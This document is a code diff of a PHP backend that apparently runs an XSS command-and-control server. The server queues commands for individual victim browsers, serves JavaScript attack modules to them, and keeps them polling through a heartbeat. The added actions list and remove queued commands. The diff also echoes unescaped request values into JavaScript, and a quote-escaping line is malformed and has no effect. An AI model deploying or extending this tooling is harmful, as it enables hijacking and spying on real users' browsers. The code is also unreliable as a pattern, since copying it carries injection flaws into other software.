@@ -1,6 +1,7 @@
 <?php 
 // include the configuration file
 require '../config.php';
+require '../jsmin.php';
 // our log file
 $log = Logger::getLogger("app");
 
@@ -90,7 +91,10 @@ function run_commands($db, $guid) {
 			$foo = parse_url($row['command']);
 
 			// log what we are about to do
-			$log->info("run {$foo['path']} ({$foo['query']})");
+			if (isset($foo['query']))
+				$log->info("run {$foo['path']} ({$foo['query']})");
+			else
+				$log->info("run {$foo['path']} ()");
 			
 			// .js or .php file?
 			$parts = explode(".", trim($foo["path"]));
@@ -100,19 +104,22 @@ function run_commands($db, $guid) {
 			if (file_exists("{$tpath}.js")) {
 				$params = get_params("{$tpath}.js");
 
-				echo "var xssgbl = Array();\n";
+				echo "xss.reg = Array();\n";
 				foreach($params as $name => $param) {
 
 					// set the parameter to the default
 					$val = $param[1];
 					// search for a parameter in this command
-					if (preg_match("/$name=([^&]+)/", $foo["query"], $matches)) {
-						// use the command value
-						$val = urldecode($matches[1]);
+					if (isset($foo["query"])) {
+						if (preg_match("/$name=([^&]+)/", $foo["query"], $matches)) {
+							// use the command value
+							$val = urldecode($matches[1]);
+						}
 					}
-					echo "xssgbl['$name'] = '$val';\n";
+					echo "xss.reg['$name'] = '$val';\n";
 				}
-				require("{$tpath}.js");
+				$script = file_get_contents("{$tpath}.js");
+				serve_javascript("{$tpath}.js");
 			}
 
 			// don't remove autorun commands
@@ -179,8 +186,10 @@ try {
 		run_commands($db, "AUTORUN");
 
 		// setup the heartbeat
-		$heartbeat=IDLE_POLL;
-		require("../modules/heartbeat.php");
+		echo "xss.reg = Array();\n";
+		echo "xss.reg['interval'] = ".IDLE_POLL.";"; 
+		serve_javascript("../modules/heartbeat.js");
+		//require("../modules/heartbeat.php");
 		exit;
 	}
 
@@ -234,8 +243,10 @@ try {
 			//$log .= str_replace("%A0", " / ", $r['log']) . "<br />";
 		}
 		$log .= "</dl>";
+		// escape single quotes
+		preg_replace("/([^\])'/", "$1\'", $log);
 
-		echo "document.getElementById('out_debug').innerHTML = '$log'; xsscls(); ";
+		echo "debug_out('$log');";// document.getElementById('out_debug').innerHTML = '$log'; xsscls(); ";
 	}
 
 	if ($_GET["A"] == "modules") {
@@ -243,11 +254,31 @@ try {
 		//$rows = $db->select("get hosts", "SELECT log FROM debug_log", array("guid" => $_GET['guid']));
 		$modules = array();
 		foreach (glob(MODULE_DIR."*.js") as $module) {
-			$modules[] = get_params($module);
+			$p1 = explode("/", $module);
+			$p2 = explode(".", end($p1));
+			$modules[$p2[0]] = get_params($module);
 		}
 		echo "module_list = " . json_encode($modules) . ";\n";
-		echo "update_modules(); xsscls();";
+		if (isset($_GET['callback']))
+			echo $_GET['callback'];
 	}
+
+	if ($_GET["A"] == "commands") {
+		$rows = $db->select("get commands", "SELECT * FROM commands", array('guid' => $_GET['target']));
+		$out = "";
+		foreach ($rows as $row) {
+			$out .= "id: {$row['id']} target: {$row['target']} command: {$row['command']}<br/>";
+		}
+		if (!isset($rows[0]))
+			echo "com_out('no commands for {$_GET['target']}');";
+		echo "com_out('$out');";
+	}
+
+	if ($_GET["A"] == "rmcmd") {
+		$db->delete("remove command", "commands", array("id" => $_GET['id']));
+		echo "com_out('Removed command id: {$_GET['id']}');";
+	}
+
 	
 
 } catch(Exception $e) {
@@ -263,7 +294,7 @@ function get_params($file) {
 	$lines = file_get_contents($file);
 	$parts = explode('/', $file);
 
-	preg_match_all("/xssopt\s*\(['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)/", $lines, $matches);
+	preg_match_all("/xss.opt\s*\(['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)/", $lines, $matches);
 	$module = array();
 
 	for($i=0,$l=count($matches[0]);$i<$l;$i++) {
@@ -273,14 +304,14 @@ function get_params($file) {
 }
 
 function cache_get($key) {
-	if (CACHE == 'APC')
+	if (CACHE == 'APC' && function_exists('apc_fetch'))
 		return apc_fetch($key);
 	return false;
 }
 
 function cache_set($key, $value) {
 	// cache for 10 minutes 
-	if (CACHE == 'APC')
+	if (CACHE == 'APC' && function_exists('apc_store'))
 		return apc_store($key, $value, 600);
 	return false;
 }
